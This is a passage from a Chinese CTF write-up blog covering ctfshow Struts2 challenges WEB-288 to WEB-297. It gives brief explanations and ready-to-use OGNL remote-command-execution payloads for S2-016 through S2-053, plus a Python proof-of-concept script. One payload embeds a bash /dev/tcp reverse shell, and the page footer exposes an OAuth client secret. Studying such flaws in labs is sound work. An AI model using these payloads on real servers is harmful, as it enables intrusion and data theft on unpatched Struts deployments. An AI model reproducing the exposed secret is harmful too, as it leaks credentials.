<p>在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令</p>
<p>所以，访问<a target="_blank" rel="noopener" href="http://your-ip:8080/index.action?redirect:OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8D%B3%E5%8F%AF%E6%89%A7%E8%A1%8COGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F">http://your-ip:8080/index.action?redirect:OGNL表达式即可执行OGNL表达式</a></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/default.action?redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(&quot;env&quot;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()&#125;</span><br></pre></td></tr></table></figure>

<p>需要注意的是提交的时候需要全字符编码</p>
<h1 id="WEB-288-S2-019"><a href="#WEB-288-S2-019" class="headerlink" title="WEB-288(S2-019)"></a>WEB-288(S2-019)</h1><p>原理：</p>
<p>要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中</p>
<p>payload: 来源:<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/246969.html">https://www.freebuf.com/vuls/246969.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?debug=command&amp;expression=#a=(new java.lang.ProcessBuilder(&#x27;id&#x27;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),#out.getWriter().println(new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()</span><br></pre></td></tr></table></figure>

<p>主要url全字符编码的时候一定要把里面的<code>&amp;</code>别编码不然会混淆</p>
<h1 id="WEB-289-S2-029"><a href="#WEB-289-S2-029" class="headerlink" title="WEB-289(S2-029)"></a>WEB-289(S2-029)</h1><p>原理:</p>
<p>Struts框架被强制执行时，对分配给某些标签的属性值进行双重评估，因此可以传入一个值，当一个标签的属性将被渲染时，该值将被再次评估</p>
<p>例如：代码执行过程大致为先尝试获取value的值，如果value为空，那么就二次解释执行了name。并且在执行前给name加上了”%{}”。最终造成二次执行</p>
<p>影响版本：Struts 2.0.0 - Struts 2.3.24.1（2.3.20.3除外）</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/default.action?message=(%23_memberAccess[&#x27;allowPrivateAccess&#x27;]=true,%23_memberAccess[&#x27;allowProtectedAccess&#x27;]=true,%23_memberAccess[&#x27;excludedPackageNamePatterns&#x27;]=%23_memberAccess[&#x27;acceptProperties&#x27;],%23_memberAccess[&#x27;excludedClasses&#x27;]=%23_memberAccess[&#x27;acceptProperties&#x27;],%23_memberAccess[&#x27;allowPackageProtectedAccess&#x27;]=true,%23_memberAccess[&#x27;allowStaticMethodAccess&#x27;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream()))</span><br></pre></td></tr></table></figure>

<h1 id="WEB-290-S2-032"><a href="#WEB-290-S2-032" class="headerlink" title="WEB-290(S2-032)"></a>WEB-290(S2-032)</h1><p>原理:</p>
<p>Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用method:<name>的方式来调用名字是<name>的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞</p>
<p>影响版本: Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=env</span><br></pre></td></tr></table></figure>

<h1 id="WEB-291-S2-033"><a href="#WEB-291-S2-033" class="headerlink" title="WEB-291(S2-033)"></a>WEB-291(S2-033)</h1><p>原理:</p>
<p>当开启动态方法调用，并且同时使用了Strut2 REST Plugin插件时，使用“!”操作符调用动态方法可能执行ognl表达式，导致代码执行</p>
<p>影响版本：Struts 2.3.20 – Struts 2.3.28 (不包括 2.3.20.3和 2.3.24.3)</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/orders/4/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=env</span><br></pre></td></tr></table></figure>

<h1 id="WEB-292-S2-037"><a href="#WEB-292-S2-037" class="headerlink" title="WEB-292(S2-037)"></a>WEB-292(S2-037)</h1><p>原理:</p>
<p>当使用REST插件启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式</p>
<p>影响版本：Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外）</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=whoami</span><br></pre></td></tr></table></figure>

<h1 id="WEB-293-S2-045"><a href="#WEB-293-S2-045" class="headerlink" title="WEB-293(S2-045)"></a>WEB-293(S2-045)</h1><p>原理:</p>
<p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵</p>
<p>恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令</p>
<p>影响版本：Struts 2.3.5 – Struts 2.3.31 Struts 2.5 – Struts 2.5.10</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: &quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;whoami&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot; boundary=----WebKitFormBoundaryXx80aU0pu6vrsV3z</span><br></pre></td></tr></table></figure>

<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692960165492-0dc1a65d-933a-4280-9bbc-3ef12278f5d5.png" alt="img"></p>
<h1 id="WEB-294-S2-046"><a href="#WEB-294-S2-046" class="headerlink" title="WEB-294(S2-046)"></a>WEB-294(S2-046)</h1><p>原理：</p>
<p>S2-046漏洞和S2-045漏洞很相似，都是由于对Header某个字段信息处理发生异常，错误信息连带着payload同过buildErrorMessage函数带入LocalizedTextUtil.findText造成的。 但是不同的是，这次漏洞的触发点在Content-Length和Content-Disposition字段的filename中。</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding:utf-8</span><br><span class="line">import requests</span><br><span class="line">class Sugarcrm():</span><br><span class="line">    def poctest(self):   </span><br><span class="line">        boundary=&quot;---------------------------735323031399963166993862150&quot;</span><br><span class="line">        paylaod=&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;env&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br><span class="line">        url = &#x27;http://200258f8-842d-4e4b-a894-ea043fd0d046.challenge.ctf.show/S2-046/doUpload.action&#x27;</span><br><span class="line">        headers = &#123;&#x27;Content-Type&#x27;: &#x27;multipart/form-data; boundary=&#x27;+boundary+&#x27;&#x27;&#125;</span><br><span class="line">        data =&quot;--&quot;+boundary+&quot;\r\nContent-Disposition: form-data; name=\&quot;foo\&quot;; filename=\&quot;&quot;+paylaod+&quot;\0b\&quot;\r\nContent-Type: text/plain\r\n\r\nx\r\n--&quot;+boundary+&quot;--&quot;</span><br><span class="line">        rs=requests.post(url, headers=headers,data=data)</span><br><span class="line">        print(rs.text)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    test = Sugarcrm()</span><br><span class="line">    test.poctest()</span><br></pre></td></tr></table></figure>

<p>不懂。。。</p>
<h1 id="WEB-295-S2-048"><a href="#WEB-295-S2-048" class="headerlink" title="WEB-295(S2-048)"></a>WEB-295(S2-048)</h1><p>又是showcase了</p>
<p>原理:</p>
<p>漏洞主要问题出在struts2-struts1-plugin这个插件包上。这个库的主要作用就是将struts1的action封装成struts2的action以便它能在strut2上运行使用</p>
<p>而由于struts2-struts1-plugin 包中的 “Struts1Action.java” 中的 execute 函数可以调用 getText() 函数，这个函数刚好又能执行OGNL表达式，同时这个 getText() 的 参数输入点，又可以被用户直接进行控制，如果这个点被恶意攻击者所控制，就可以构造恶意执行代码，从而实现一个RCE攻击</p>
<p>影响版本: 2.0.0 - 2.3.32</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692963120663-1045940c-f911-4e1d-af71-a1808e8f746d.png" alt="img"></p>
<p>成功执行</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692963158825-e4b7adae-128b-4bdf-b248-2c600091a40c.png" alt="img"></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure>

<p>注入点在第一个栏里</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692963566791-1536b3ed-3280-40e4-9a99-55dbe5916d98.png" alt="img"></p>
<p>flag就是这段 因为它报错不能解析我们的uuid</p>
<h1 id="WEB-296-S2-052"><a href="#WEB-296-S2-052" class="headerlink" title="WEB-296(S2-052)"></a>WEB-296(S2-052)</h1><p>这题直接用脚本poc打就行了 看好多师傅payload打不了</p>
<h1 id="WEB-297-S2-053"><a href="#WEB-297-S2-053" class="headerlink" title="WEB-297(S2-053)"></a>WEB-297(S2-053)</h1><p>原理:</p>
<p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>

<p>直接rce env找不到flag 反弹shell env才有flag 逆天</p>
<h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>也就当作是熟悉了 只是payload的搬运工:)</p>

    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/post/7eb33f7a.html" rel="prev" title="ctfshow-ssti">
                  <i class="fa fa-chevron-left"></i> ctfshow-ssti
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/post/c7a57718.html" rel="next" title="NSSCTF 2nd WP与学习">
                  NSSCTF 2nd WP与学习 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments gitalk-container"></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">陇ICP备2023001761号-1 </a>
  </div>

<div class="copyright">
  &copy; 2023.2 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Z1d10t</span>
</div>



    </div>
  </footer>

  

  <a href="https://github.com/Z1d10t" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  




<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">

<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"Z1d10t","repo":"Z1d10t.github.io","client_id":"c9dd41fa890386350257","client_secret":"c78f6b60a410862c2dcc596f09db2f0c06f025c6","admin_user":"Z1d10t","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"9c2f88151fee9c202ef528e6a2ba0a9c"}</script>
<script src="/js/third-party/comments/gitalk.js"></script>

</body>
</html>

